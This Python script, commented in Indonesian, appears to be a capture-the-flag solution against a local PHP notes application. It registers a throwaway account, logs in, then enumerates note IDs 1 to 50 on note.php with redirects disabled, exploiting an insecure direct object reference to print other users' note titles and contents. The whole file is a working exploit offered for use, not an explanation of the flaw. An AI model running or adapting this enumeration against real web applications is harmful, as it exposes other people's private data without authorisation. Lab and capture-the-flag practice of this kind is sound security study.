import requests
import random
import string
import re

# Ganti port kalau beda
URL = "http://localhost:1337"

def exploit():
    s = requests.Session()
    
    # --- 1. Register User Asal-asalan (Biar dapet Session) ---
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    password = "password123"
    print(f"[*] Registering user: {username}")
    
    # Register
    s.post(f"{URL}/auth.php", data={
        'action': 'register',
        'username': username,
        'password': password,
        'email': f'{username}@pwn.com'
    })
    
    # Login
    print("[*] Logging in...")
    r_login = s.post(f"{URL}/auth.php", data={
        'action': 'login',
        'username': username,
        'password': password
    })

    # Cek login berhasil gak
    if "Dashboard" not in r_login.text and r_login.status_code != 302:
        print("[!] Login mungkin gagal, tapi kita coba lanjut brute force IDOR.")

    # --- 2. IDOR Brute Force (Tanpa Redirect) ---
    print("[*] Starting Brutal IDOR enumeration (ID 1-50)...")
    
    found_any = False
    
    for i in range(1, 51): # Kita naikin range sampe 50 jaga-jaga
        # allow_redirects=False PENTING! 
        # Kalau status 302/Redirect -> Berarti note gak ada / bukan punya kita (normal logic)
        # TAPI di source code ini: if (!$note) redirect. Jadi kalau 200 OK berarti note ADA.
        try:
            r = s.get(f"{URL}/note.php?id={i}", allow_redirects=False)
            
            # Kalau 200 OK, berarti halaman kebuka (Gak di redirect ke dashboard)
            if r.status_code == 200:
                found_any = True
                print(f"\n[+] FOUND NOTE ID: {i}")
                
                # Ambil Judul Note
                title = re.search(r'<h1>(.*?)</h1>', r.text)
                if title:
                    print(f"    Title: {title.group(1)}")
                
                # Ambil Isi Note (Content)
                # Kita ambil textarea content karena biasanya lebih bersih
                content = re.search(r'<textarea.*?>(.*?)</textarea>', r.text, re.DOTALL)
                if content:
                    print(f"    Content: {content.group(1).strip()}")
                else:
                    # Fallback kalau gak nemu textarea, print raw text body dikit
                    print(f"    Raw Text: {r.text[:200]}...")

        except Exception as e:
            print(f"[-] Error accessing ID {i}: {e}")

    if not found_any:
        print("\n[-] Gak nemu note satupun. Database kosong atau ID-nya jauh banget.")

if __name__ == "__main__":
    exploit()
